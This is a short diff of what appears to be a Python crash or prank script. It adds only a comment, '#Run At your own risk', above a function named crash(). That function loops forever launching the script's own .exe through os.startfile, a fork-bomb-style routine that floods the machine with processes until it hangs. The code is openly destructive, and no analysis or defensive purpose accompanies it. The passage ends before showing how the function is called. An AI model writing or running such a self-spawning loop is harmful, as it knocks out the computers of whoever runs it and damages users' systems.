@@ -1,5 +1,6 @@
 import os
 import threading
+#Run At your own risk
 def crash():
     while True:
         os.startfile(__file__[:-2]+"exe")
